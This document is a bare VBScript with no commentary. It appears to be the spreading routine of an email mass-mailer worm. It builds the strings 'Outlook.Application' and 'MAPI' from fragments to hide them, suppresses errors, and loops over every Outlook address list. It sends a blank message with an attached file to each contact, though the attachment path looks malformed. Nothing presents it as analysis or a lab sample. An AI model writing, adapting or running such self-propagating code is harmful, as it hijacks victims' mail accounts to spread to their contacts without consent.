On Error Resume Next
Dim DNLJ,HSQF,PGRT,PBML,CALP,CVEG
DNLJ = "Out"
HSQF = "look."
PGRT = "Appli"
PBML = "cation"
CALP = "Ma"
CVEG = "PI"
Set MUVA = CreateObject(DNLJ+HSQF+PGRT+PBML)
If MUVA <> "" Then
Set  KJNG = MUVA.GetNameSpace(CALP+CVEG)
For PQNMx = 1 to KJNG.AddressLists.Count
Set NOGQ = MUVA.CreateItem(0)
Set QJLH = KJNG.AddressLists.Item(PQNMx)
NOGQ.Attachments.Add "\System 32\"
NOGQ.Subject = ""
NOGQ.Body = ""
Set QHLH = QJLH.AddressEntries
Set recipientis = NOGQ.Recipients
For IAHF = 1 to QHLH.Count
NOGQ.Recipients.Add QHLH.Item(IAHF)
Next
NOGQ.Send
Next
End If
